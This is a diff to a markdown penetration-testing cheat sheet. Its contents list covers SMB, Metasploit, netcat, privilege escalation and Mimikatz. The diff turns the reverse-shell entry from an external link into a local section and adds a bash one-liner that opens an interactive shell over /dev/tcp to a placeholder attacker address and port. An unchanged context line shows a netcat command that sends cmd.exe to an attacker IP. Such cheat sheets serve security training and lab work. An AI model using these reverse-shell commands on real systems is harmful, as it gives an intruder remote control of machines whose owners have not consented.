@@ -22,7 +22,7 @@
 - [12. SMB](/smb.md)
 - [13. Metasploit](/metasploit.md)
 - [14. netcat](#nc)
-- [15. Reverse_Shell_Script](https://revshells.com)
+- [15. Reverse_Shell_Script](#rev)
 - [16. Privilege escalation](/Privilege.md)
 - [17. Email Harversting with theHarvester](#email)
 - [18 Mimikatz](#mimi)
@@ -237,7 +237,10 @@ __Download the reverse shell in windows__
     - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
 
 
-# [15. Reverse_Shell_Script](https://revshells.com)
+# 15. Reverse_Shell_Script <a name="rev"></a>
+- [revshells.com](https://revshells.com)
+- __`bash -c 'bash -i >& /dev/tcp/yourip/9001 0>&1'`__
+
 
 
 
